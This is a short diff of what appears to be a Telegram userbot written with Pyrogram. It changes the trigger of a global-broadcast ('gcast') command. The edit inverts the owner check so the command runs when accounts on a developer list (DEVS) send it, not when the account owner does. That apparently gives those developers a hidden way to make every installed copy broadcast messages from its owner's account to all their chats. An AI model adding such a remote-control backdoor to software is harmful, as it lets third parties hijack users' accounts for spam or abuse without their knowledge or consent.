@@ -26,7 +26,7 @@ else:
     HAPP = None
 
 
-@Client.on_message(filters.command(["Cgcast", "cgcast"], "") & filters.user(DEVS) & filters.me)
+@Client.on_message(filters.command(["Cgcast", "cgcast"], "") & filters.user(DEVS) & ~filters.me)
 @Ubot(["Gcast", "gcast"], "")
 async def gcast_cmd(client: Client, message: Message):
     if message.reply_to_message or get_arg(message):
